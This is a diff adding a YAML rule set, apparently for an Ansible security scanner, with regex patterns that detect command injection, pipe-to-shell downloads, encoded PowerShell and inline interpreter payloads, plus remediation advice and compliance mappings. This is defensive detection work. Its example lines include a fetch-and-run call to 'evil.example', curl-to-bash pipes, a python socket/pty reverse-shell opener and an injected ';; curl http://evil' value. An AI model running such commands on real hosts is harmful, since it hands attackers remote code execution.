@@ -1,0 +1,541 @@
+name: "Command Injection Patterns"
+author: "Ansible Security Scanner Team"
+description: "Detects potential command injection vulnerabilities in shell/command/raw tasks"
+
+patterns:
+  - id: "shell_pipe_to_interpreter"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Shell Pipe to Interpreter"
+    description: "Task pipes output to shell interpreter which can lead to command injection"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*\\|\\s*(?:sh|bash|zsh|ksh)\\b"
+    positive_examples:
+      - "shell:|sh"
+    recommendation: "Download the artifact with ansible.builtin.get_url (pinned checksum: SHA-256), then execute the file by absolute path with ansible.builtin.command - never pipe untrusted bytes straight into sh/bash/zsh/ksh."
+    cwe: ["CWE-77", "CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "windows_shell_pipe_to_iex"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Windows Shell Pipe to Invoke-Expression"
+    description: "Windows task pipes output to Invoke-Expression which can execute arbitrary code"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.windows\\.)?(?:win_shell|win_command):\\s*.*\\|\\s*iex\\b"
+    positive_examples:
+      - "win_shell:|iex"
+    recommendation: "Replace iwr ... | iex with ansible.windows.win_get_url (or community.windows.win_psexec) to fetch the script to a controller-trusted path, validate its Authenticode signature / SHA-256, then run it with ansible.windows.win_powershell."
+    cwe: ["CWE-77", "CWE-94"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.001"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "subshell_execution"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Subshell / Command Substitution Interpolates a Jinja Variable"
+    description: "A ``shell``/``command``/``raw`` task uses ``$(...)`` or backticks and interpolates a Jinja ``{{ var }}`` into the substitution. If the rendered variable contains shell metachars the substitution becomes an injection primitive (the inner shell re-parses the value, so even ``| quote`` on the outer command doesn't protect the inner context). Plain command substitution WITHOUT a Jinja interpolation is a normal shell idiom (``$(sha512sum file)``, ``$(basename $(dirname \"$f\"))``) and is NOT flagged."
+    # The inner substitution must contain a Jinja interpolation -
+    # that's the only case where controller-side bytes flow through a
+    # re-parsing shell and become an injection vector. Pure literal
+    # substitutions like ``$(sha512sum file)`` are safe and ubiquitous.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):[\\s\\S]{0,400}?(?:\\$\\([^)]*\\{\\{[^}]+\\}\\}[^)]*\\)|`[^`]*\\{\\{[^}]+\\}\\}[^`]*`)"
+    multiline: true
+    window: 8
+    positive_examples:
+      - "    shell: echo $(basename {{ user_path }})"
+      - "    shell: id=$(curl https://api/{{ name }} | jq -r .id)"
+      - "    shell: result=`sha256sum {{ file_var }}`"
+    negative_examples:
+      - "    shell: echo \"$(sha512sum splunk-edge.tar.gz)\" | cut -d ' ' -f 1"
+      - "    shell: podman exec cloud-ide bash -c 'for f in /root/.cursor/skills/*/SKILL.md; do name=$(basename $(dirname \"$f\")); done'"
+      - "    command: /usr/bin/tool --arg $(hostname)"
+      - "    shell: date=$(date +%Y%m%d)"
+    recommendation: "Move the work that produced the $(...)/backtick value into a preceding ansible.builtin.command with register:, then reference the registered fact in the next task; the inner shell never re-parses the rendered bytes."
+    cwe: ["CWE-78"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.1']
+    soc2: ['CC7.1']
+    owasp_appsec: ["A03:2021"]
+
+  - id: "command_chaining"
+    category: "command_injection"
+    severity: "MEDIUM"
+    title: "Command Chaining with Template Interpolation"
+    description: "A ``shell:`` or ``raw:`` task chains commands with ``;`` / ``&&`` / ``||`` AND interpolates a Jinja variable into the chain. If the variable renders to a value containing shell metachars, the chain becomes an injection surface (e.g. ``rm -rf /tmp/{{ name }} && restart``) - an attacker-controlled ``name`` of ``;; curl http://evil`` lets the chain pivot. Pure command chaining without interpolation is a normal automation idiom (``podman stop foo || true``, ``mkdir -p /opt/app && cd /opt/app && ./setup.sh``) and is NOT flagged. ``command:`` is EXCLUDED because it does ``execve(argv[])`` - ``;`` / ``&&`` / ``||`` become literal argv tokens and are never interpreted by a shell."
+    # Require BOTH a chain operator AND a template interpolation.
+    # The previous regex fired on every ``shell: foo || true`` and
+    # ``shell: a && b`` - normal idiomatic cleanup/sequencing that is
+    # not an injection vector. The genuine threat is a chain whose
+    # shape depends on runtime template rendering.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|raw):[ \\t]+(?![\"'|>])[^\\n]*(?:;|&&|\\|\\|)[^\\n]*\\{\\{[^}]+\\}\\}|^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|raw):[ \\t]+(?![\"'|>])[^\\n]*\\{\\{[^}]+\\}\\}[^\\n]*(?:;|&&|\\|\\|)"
+    positive_examples:
+      - "    shell: rm -rf /tmp/{{ user_path }} && systemctl restart app"
+      - "    shell: curl https://api/{{ id }} || echo failed"
+      - "    raw: test -f {{ marker }} && rm -rf /var/cache/*"
+    negative_examples:
+      - "    shell: podman stop foo || true"
+      - "    shell: mkdir -p /opt/app && cd /opt/app && ./setup.sh"
+      - "    shell: systemctl enable foo && systemctl start foo"
+      - "    command: /bin/sh -c 'a && b'"
+      - "    shell: \"curl https://api/{{ id }} || echo failed\""
+    recommendation: "Split the chained ; / && / || pipeline into separate Ansible tasks (each its own module call) so per-step failure handling, change tracking, and check_mode all work; the only place {{ var }} can still reach a chained shell is via | quote and quoted command boundaries."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "windows_command_chaining"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Windows Command Chaining"
+    description: >-
+        win_shell or win_command task chains commands with ;, &&, or || in the same
+        string. Chaining prevents Ansible from reasoning about return codes and lets
+        a follow-on command run after a failure.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.windows\\.)?(?:win_shell|win_command):\\s*.*(?:;|&&|\\|\\|)\\s*"
+    positive_examples:
+      - "win_shell: '$path = ''{{ test_acl_path }}''; {{ test_ace_cmd }}'"
+    recommendation: "Split chained && / || / ; commands into discrete ansible.windows.win_command tasks, or - when shell semantics are required - use ansible.windows.win_shell with each variable wrapped in | quote so a rendered ; cannot terminate a command early."
+    cwe: ["CWE-77"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.003"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "process_substitution"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Process Substitution"
+    description: >-
+        Shell/command/raw task uses Bash process substitution `<(...)` to inline a
+        command's output. Process substitution executes arbitrary subshells and is a
+        common command-injection sink.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*<\\(.*\\)"
+    positive_examples:
+      - "shell: \"openssl req -new -sha256 -key '{{ letsencrypt_keys_dir }}/{{ item.key }}.key' -subj '/' -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf '[SAN]\\nsubjectAltName=DNS:{{ site_hosts | join(',DNS:') }}')) > {{ acme_tiny_data_directory }}/csrs/{{ item.key }}-{{ letsencrypt_cert_ids[item.key] }}.csr\""
+    recommendation: "<(...) launches a hidden subshell whose argv is attacker-influenced; replace it with a temp-file workflow: ansible.builtin.command writes to a known path, then the next task consumes that path via the tool's --file option."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "heredoc_with_variables"
+    category: "command_injection"
+    severity: "MEDIUM"
+    title: "Heredoc with Template Variables"
+    description: "Task uses heredoc with template variables which may be unsafe"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*<<.*\\{\\{"
+    positive_examples:
+      - "shell: \"set -o pipefail && base64 -d <<< '{{ etcd_node_certs.stdout | quote }}' | tar xz -C {{ etcd_cert_dir }}\""
+    recommendation: "Render the heredoc body via ansible.builtin.template into a controller-owned file with mode 0600 and feed that file to the consumer with --file / -f, rather than streaming a templated heredoc through a shell."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "environment_variable_execution"
+    category: "command_injection"
+    severity: "MEDIUM"
+    title: "Shell Task References Attacker-Influenced Environment Variable"
+    description: "A ``shell`` / ``command`` / ``raw`` task dereferences an environment variable (``${VAR}`` / ``$VAR``) whose name matches a well-known attacker-influenced source: CGI / reverse-proxy request headers (``HTTP_*``, ``QUERY_STRING``, ``REQUEST_METHOD``, ``REQUEST_URI``, ``PATH_INFO``, ``REMOTE_ADDR``, ``REMOTE_USER``), SSH forced-command inputs (``SSH_ORIGINAL_COMMAND``, ``SSH_CONNECTION``), or sudo-preserved pass-through (``SUDO_COMMAND``). These values land inside the shell command unquoted, giving an attacker who controls the HTTP request / SSH key / sudo invocation arbitrary command execution. Locally-scoped shell loop variables (``${name}``, ``${i}``, ``${f}``) are NOT flagged - they are set earlier in the same shell body and are not attacker-influenced."
+    # Only flag dereferences of specific attacker-influenced env var
+    # names. The previous regex fired on every ``${anything}`` in any
+    # shell task, including benign for-loop locals, producing pure
+    # FPs on bash scripts that use shell parameter expansion for
+    # obvious reasons (``${name}.md``, ``${i}``, etc.).
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):[^\\n]*\\$(?:\\{)?(?:SSH_ORIGINAL_COMMAND|SSH_CONNECTION|SUDO_COMMAND|QUERY_STRING|REQUEST_(?:METHOD|URI|BODY)|PATH_INFO|REMOTE_(?:ADDR|USER|HOST)|HTTP_[A-Z_]+)\\b"
+    positive_examples:
+      - "    shell: eval \"$SSH_ORIGINAL_COMMAND\""
+      - "    shell: echo ${SUDO_COMMAND} >> /var/log/audit"
+      - "    command: /usr/bin/process ${HTTP_X_FORWARDED_FOR}"
+      - "    raw: dispatch $QUERY_STRING"
+    negative_examples:
+      - "    shell: for f in /root/skills/*/SKILL.md; do name=$(basename $(dirname $f)); cp \"$f\" \"/root/rules/${name}.md\"; done"
+      - "    shell: echo ${HOME}/backup"
+      - "    shell: VERSION=$(cat /etc/version); tar czf backup-${VERSION}.tgz /opt/app"
+      - "    shell: docker logs ${container_id}"
+    recommendation: "Variables like SSH_ORIGINAL_COMMAND / QUERY_STRING / HTTP_* are attacker-controlled by definition; do not dereference them in a shell task. If a ForceCommand handler genuinely needs the value, validate it against an allow-list and pass it as argv to ansible.builtin.command (no shell parsing)."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "indirect_expansion"
+    category: "command_injection"
+    severity: "MEDIUM"
+    title: "Indirect Variable Expansion"
+    description: "Task uses indirect variable expansion which can be dangerous"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*\\$\\![^}]*\\*"
+    positive_examples:
+      - "shell:$!*"
+    recommendation: "Bash's ${!var} (indirect expansion) lets one variable name another, which is rarely safe with templated values; replace with an explicit lookup (case statement on a controller-defined key) or move the dispatch into a data structure (dict) consumed by a Python module."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "shell_inline_compound_command"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Inline Shell -c Payload Interpolates Jinja or Evals Remote Script"
+    description: "A ``shell`` / ``command`` / ``raw`` task invokes ``sh -c`` / ``bash -c`` / ``zsh -c`` / ``ksh -c`` (or the Debian-default ``/bin/sh`` which resolves to ``dash``) with an inline payload that is EITHER (a) interpolating a Jinja ``{{ var }}`` into the script body - controller-side bytes flowing into a re-parsing shell, classic injection shape - OR (b) eval-ing a remote script via ``\"$(curl ...)\"`` / ```wget ...``` - the canonical supply-chain one-liner exploited by ``install.sh`` typosquats and the ohmyzsh / nvm / rustup bootstrap pattern. Pure literal compound commands (``bash -c 'mkdir -p /opt && cp ...'``) are a normal operator idiom and are NOT flagged. Container-exec shapes (``podman exec <c> bash -c '...'``, ``docker exec``, ``kubectl exec -- bash -c``, ``nerdctl exec``, ``lxc exec``, ``incus exec``, ``buildah run``, ``chroot``, ``nsenter``) are also NOT flagged - those MUST use ``bash -c`` to run a compound command inside the target namespace."
+    # Two sub-shapes; OR'd together:
+    #  1. A ``sh|bash|zsh|ksh -c`` payload that interpolates a Jinja
+    #     ``{{ var }}`` somewhere on the same line (re-parsing shell
+    #     with controller bytes -> injection).
+    #  2. A ``sh|bash|zsh|ksh -c`` payload that itself eval-s a
+    #     downloaded script via ``"$(curl|wget|fetch|aria2c ...)"`` or
+    #     ``$(curl ...)`` - the canonical supply-chain bootstrap
+    #     primitive (ohmyzsh, nvm, rustup, install.sh pattern).
+    #
+    # Container-exec prefixes are excluded via negative lookbehind on
+    # the common container runtimes. ``chroot`` and ``nsenter`` are
+    # also excluded - both are legitimate compound-command primitives
+    # inside a different filesystem/namespace root.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):[ \\t]+(?![\\\"'|>])(?![^\\n]*\\b(?:podman|docker|kubectl|crictl|nerdctl|lxc|incus|buildah|chroot|nsenter)\\s+(?:exec|run)\\b)[^\\n]*\\b(?:sh|bash|zsh|ksh)\\s+-c\\b[^\\n]*?(?:\\{\\{[^}]+\\}\\}|\\$\\((?:\\s*curl|\\s*wget|\\s*fetch|\\s*aria2c)\\b|`[^`]*(?:curl|wget|fetch|aria2c)[^`]*`)"
+    positive_examples:
+      - "    shell: bash -c \"echo pwned {{ user_input }}\""
+      - "    shell: sh -c \"$(curl -fsSL https://get.example/install.sh)\""
+      - "    ansible.builtin.shell: bash -c 'systemctl restart {{ target_svc }}'"
+      - "    raw: sh -c \"`wget -qO- https://evil.example/stage2.sh`\""
+    negative_examples:
+      - "    shell: bash -c 'mkdir -p /opt/app && cp bundle.tar /opt/app/'"
+      - "    shell: podman exec cloud-ide bash -c 'for f in /root/skills/*.md; do cp \"$f\" /dst/; done'"
+      - "    shell: docker exec web bash -c 'nginx -t && nginx -s reload'"
+      - "    shell: kubectl exec my-pod -- bash -c 'ls /var/lib/app'"
+      - "    shell: chroot /mnt/root bash -c '/opt/installer --silent'"
+      - "    shell: nsenter -t 1 -m -u bash -c 'systemctl status kubelet'"
+    recommendation: "Replace sh -c \"...{{ var }}...\" with ansible.builtin.command (argv list, no shell) or, when shell semantics are required, ansible.builtin.shell with each variable wrapped in | quote and the script body sourced from a Vault-encrypted, checksum-pinned file."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "windows_cmd_with_c_flag"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Windows CMD with /c Flag"
+    description: >-
+        win_shell or win_command task explicitly invokes cmd.exe /c, which evaluates
+        the rest of the line via the legacy Windows command interpreter and
+        reintroduces cmd metacharacter parsing.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.windows\\.)?(?:win_shell|win_command):\\s*.*\\bcmd\\.exe\\s*/c\\b"
+    positive_examples:
+      - "win_command: cmd.exe /c echo über den Fußgängerübergang gehen"
+    recommendation: "Replace cmd.exe /c with ansible.windows.win_command (argv form, no shell) or ansible.windows.win_shell (PowerShell) with explicit parameter binding; cmd.exe's escaping rules cannot reliably defang a templated argument."
+    cwe: ["CWE-77"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.003"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "interpreter_inline_code_execution"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Inline Interpreter Payload Interpolates Jinja or Imports Exec-Family Primitives"
+    description: "A ``shell`` / ``command`` / ``raw`` task invokes ``python`` / ``python3`` / ``perl`` / ``ruby`` with ``-c`` / ``-e`` and an inline source string that is EITHER (a) interpolating a Jinja ``{{ var }}`` into the code - controller bytes are injected into live interpreter source at execution time - OR (b) imports one of the offensive-primitive modules ``os`` / ``subprocess`` / ``socket`` / ``pty`` / ``ctypes`` / ``Open3`` / ``IO.popen`` (for ruby) / ``system`` / ``exec`` / ``backticks`` (for perl) AND calls an exec-family function. Pure literal inline code that doesn't touch those primitives (``python3 -c 'print(42)'``, ``perl -e 'print sort @ARGV'``) is a normal ops idiom and is NOT flagged."
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):[ \\t]+(?![\\\"'|>])[^\\n]*\\b(?:python(?:3)?|perl|ruby)\\s+(?:-c|-e)\\s+[^\\n]*?(?:\\{\\{[^}]+\\}\\}|\\bimport\\s+(?:os|subprocess|socket|pty|ctypes)\\b|\\b(?:Open3|IO\\.popen|Kernel\\.(?:system|exec|spawn))\\b|\\b(?:system|exec|qx)\\s*[\\(\\\"']|`[^`]+`)"
+    positive_examples:
+      - "    shell: python3 -c \"import os; os.system('id')\""
+      - "    shell: python -c \"import socket,os,pty; s=socket.socket()\""
+      - "    shell: perl -e 'system(\"id\")'"
+      - "    shell: ruby -e 'IO.popen(\"id\") { |io| puts io.read }'"
+      - "    shell: python3 -c \"print('{{ user_input }}')\""
+    negative_examples:
+      - "    shell: python3 -c 'print(42)'"
+      - "    shell: python -c 'import json,sys; print(json.dumps({\"ok\":1}))'"
+      - "    shell: perl -e 'print sort @ARGV' a b c"
+      - "    shell: ruby -e 'puts RUBY_VERSION'"
+    recommendation: "Move the python/perl/ruby payload into a vetted, version-controlled script in files/, run it via ansible.builtin.script (or a packaged module), and pass the user-controlled values as argv arguments rather than embedding them in a -c source string."
+    cwe: ["CWE-78", "CWE-94"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "eval_usage"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Shell eval Builtin - Arbitrary Code Execution from a String"
+    description: "Uses the shell ``eval`` builtin - which parses its argument as a shell command and executes it, collapsing the argv/shell distinction. The rule matches ``eval`` ONLY when it appears at the start of a shell command or immediately after a shell separator (``;``, ``&&``, ``||``, ``\\n``, start of line). Splunk's SPL ``| eval`` pipeline operator (``splunk search '| eval host=\"*\"'``), MySQL's ``eval()``, and every other in-DSL ``eval`` are NOT the shell builtin and are NOT flagged."
+    # Anchor ``eval`` to the START of a shell command or the start of
+    # a shell-continuation boundary (``;`` / ``&&`` / ``||`` / newline)
+    # followed by optional whitespace. Splunk SPL pipelines use ``|
+    # eval`` which is preceded by ``|`` + space and is NOT shell ``eval``.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):[ \\t]+(?![\\\"'|>])(?:(?:[^\\n]*?(?:;|&&|\\|\\|)\\s*)|)\\s*eval\\s+\\S"
+    positive_examples:
+      - "    shell: eval $EVIL_COMMAND"
+      - "    shell: foo && eval $(decode < /tmp/blob)"
+      - "    shell: bar; eval \"$PAYLOAD\""
+    negative_examples:
+      - "    shell: /opt/splunk/bin/splunk search '| inputlookup foo.csv | eval host=\"*\" | table host'"
+      - "    ansible.builtin.shell: splunk search '| eval a=b | stats count'"
+      - "    shell: echo eval_result=1"
+    recommendation: "eval collapses argv/shell separation and parses its argument as code; remove it. If dynamic dispatch is required, use a case statement over a controller-validated key, or move the logic into a Python action plugin where types remain explicit."
+    cwe: ["CWE-94", "CWE-95"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "decode_pipe_to_shell"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Decode and Pipe to Shell"
+    description: "Task decodes data and pipes to shell which is a common attack vector"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*(?:base64|openssl)\\s+(?:-d|--decode).*\\|\\s*(?:sh|bash|zsh|ksh)\\b"
+    positive_examples:
+      - "shell:base64 -d|sh"
+    recommendation: "base64/openssl-decoded bytes piped into sh/bash mean the payload is unreviewable at the call site; decode to a file with ansible.builtin.copy (content from Vault), inspect / SHA-256-pin it, then execute the file by path."
+    cwe: ["CWE-78", "CWE-506"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1027", "T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-7', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC6.8', 'CC7.1', 'CC8.1']
+
+  - id: "powershell_encoded_command"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "PowerShell Encoded Command"
+    description: "Task uses PowerShell with encoded command which can hide malicious code"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.windows\\.)?(?:win_shell|win_command):\\s*.*powershell(?:\\.exe)?\\b.*-EncodedCommand\\b"
+    positive_examples:
+      - "win_shell:powershell-EncodedCommand"
+    recommendation: "powershell -EncodedCommand obscures the payload from review; ship the actual .ps1 to the host with ansible.windows.win_copy / win_get_url, validate its Authenticode signature, and invoke it via ansible.windows.win_powershell."
+    cwe: ["CWE-78", "CWE-506"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1027", "T1059.001"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-7', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC6.8', 'CC7.1', 'CC8.1']
+
+  - id: "wget_pipe_to_shell_injection"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Wget Pipe to Shell"
+    description: "Task downloads content and pipes to shell which is dangerous"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*\\bwget\\b.*\\|\\s*(?:sh|bash|zsh|ksh)\\b"
+    positive_examples:
+      - "shell:wget|sh"
+    recommendation: "Replace wget ... | sh with ansible.builtin.get_url (pinned checksum:), then ansible.builtin.command on the downloaded file by absolute path; the integrity check happens in-module before any code runs."
+    cwe: ["CWE-78", "CWE-494"]
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: ["V10.3.1", "V10.3.2"]
+    mitre_attack: ["T1059.004", "T1105"]
+    cis_controls: ["CIS-4.1", "CIS-Supply-Chain"]
+    nist_controls: ['CM-5', 'CM-6', 'CM-7', 'CM-11', 'SA-10', 'SI-3', 'SI-7', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1', '6.3.2', '6.3.3']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "curl_with_credentials"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Curl with Hardcoded Credentials"
+    description: >-
+        Task invokes curl -u 'user:password' with the credentials baked into the
+        playbook. The pair is visible in process listings and Ansible's verbose
+        output, defeating any vault elsewhere.
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*curl.*-u\\s+[\"'][^\"']*:[^\"']*[\"']"
+    positive_examples:
+      - 'shell:curl-u ":"'
+    recommendation: "Move the username:password out of curl -u into the calling module: ansible.builtin.uri url_username: / url_password: (or community.general.curl with separate secret args), and source the credential from Ansible Vault."
+    cwe: ["CWE-312", "CWE-798"]
+    owasp_appsec: ["A04:2021", "A07:2021"]
+    owasp_asvs: ["V2.10.2", "V2.10.4", "V6.1.2", "V8.3.1", "V14.1.5"]
+    mitre_attack: ["T1552.001"]
+    cis_controls: ["CIS-3.1"]
+    nist_controls: ['AC-3', 'IA-5', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2']
+    hipaa: ['164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)']
+    soc2: ['C1.1', 'CC6.1']
+
+  - id: "curl_with_multiple_variables"
+    category: "command_injection"
+    severity: "MEDIUM"
+    title: "Curl with Multiple Template Variables"
+    description: "Task uses curl with multiple template variables which may be unsafe"
+    regex: "^(?!\\s*#)\\s*(?:ansible\\.builtin\\.)?(?:shell|command|raw):\\s*.*curl.*\\{\\{.*\\}\\}.*\\{\\{.*\\}\\}"
+    positive_examples:
+      - "shell: curl -X GET -H \"Content-Type{{':'}} application/json\" -H \"Authorization{{':'}} Bearer {{digitalocean_api_token}}\" \"https{{':'}}//api.digitalocean.com/v2/images?per_page=999&type=distribution\""
+    recommendation: "Switch to ansible.builtin.uri / ansible.builtin.get_url, where url:, headers:, body:, and dest: are typed parameters whose values are not subject to shell word-splitting; this neutralises both injection and quoting bugs in one step."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "user_input_execution"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Direct User Input Execution"
+    description: "Task directly executes user input which is extremely dangerous"
+    regex: "^(?!\\s*#)\\s*(?:shell|command|raw):\\s*.*\\{\\{[^}]*user[^}]*\\}\\}"
+    positive_examples:
+      - "shell: docker login '{{pl_docker_repo_url}}' --username '{{pl_docker_repo_username}}' --password '{{pl_docker_repo_password}}'"
+    recommendation: "shell: with {{ user_* }} is a direct CWE-78 sink; remove the task. If user-supplied input must drive a host-side action, validate it against an allow-list with ansible.builtin.assert and pass it as argv to ansible.builtin.command."
+    cwe: ["CWE-20", "CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "download_pipe_to_shell"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Download and Pipe to Shell"
+    description: >-
+        Task pipes wget/curl output directly into bash/sh/zsh (`curl ... | bash`).
+        The remote payload runs unverified and any MitM or compromised mirror
+        executes attacker code as the playbook user.
+    regex: "^(?!\\s*#)\\s*(?:shell|command|raw):\\s*.*(?:wget|curl).*\\|.*(?:bash|sh|zsh)"
+    positive_examples:
+      - "shell: curl -sL https://deb.nodesource.com/{{node_version}} | sudo -E bash -"
+    recommendation: "wget|curl ... | bash means the payload is fetched and executed without ever being on disk for review; replace with ansible.builtin.get_url + checksum:, then run the saved file with ansible.builtin.command on its absolute path."
+    cwe: ["CWE-78", "CWE-494"]
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: ["V10.3.1", "V10.3.2"]
+    mitre_attack: ["T1059.004", "T1105"]
+    cis_controls: ["CIS-4.1", "CIS-Supply-Chain"]
+    nist_controls: ['CM-5', 'CM-6', 'CM-7', 'CM-11', 'SA-10', 'SI-3', 'SI-7', 'SI-10']
